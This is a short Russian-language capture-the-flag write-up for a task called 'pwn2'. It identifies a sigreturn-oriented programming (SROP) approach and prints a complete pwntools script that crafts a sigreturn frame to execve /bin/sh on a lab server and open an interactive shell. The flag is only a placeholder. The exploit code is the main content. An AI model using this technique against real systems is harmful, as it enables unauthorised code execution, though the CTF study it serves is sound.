# pwn2

Закидываем программу в дизассемблер, видим только вызов syscall()

Очень похоже, что мы должны использовать тактику SROP!

Напишем скрипт под это дело:

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = remote("192.168.12.13", 1555)

BINSH = elf.address + 0x1238
POP_RAX = 0x10000018
SYSCALL_RET = 0x10000015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```

Получим флаг: `nto{ТАСК_ЛЕЖАЛ_НА_МОМЕНТ_РАЙТАПА_ЗАМЕНИМ}`
